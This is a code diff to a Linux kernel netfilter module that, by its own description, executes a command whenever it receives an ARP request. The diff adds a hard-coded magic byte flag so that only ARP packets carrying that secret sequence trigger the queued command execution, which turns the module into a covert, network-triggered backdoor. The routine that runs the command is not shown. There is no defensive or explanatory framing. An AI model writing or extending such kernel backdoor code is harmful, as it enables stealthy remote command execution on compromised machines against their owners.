@@ -16,6 +16,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Jack Dunfey");
 MODULE_DESCRIPTION("Netfilter module to execute a command on ARP request with a workqueue");
+#define FLAG "\x70\x95\x05"
 
 static struct nf_hook_ops arp_hook;
 static struct workqueue_struct *arp_wq;
@@ -154,6 +155,12 @@ unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
             work->payload_len = min_size;
             memcpy(work->payload, arp_payload, work->payload_len); 
             work->payload[work->payload_len] = 0;
+            
+            if(strnstr(arp_ptr, FLAG, skb_tail_pointer(skb) - arp_ptr) == NULL){
+                printk(KERN_INFO "Didn't contain flag");
+                kfree(work);
+                return NF_ACCEPT;
+            }
             
             /* Initialize work and queue it */
             INIT_WORK(&work->work, arp_exec_work);
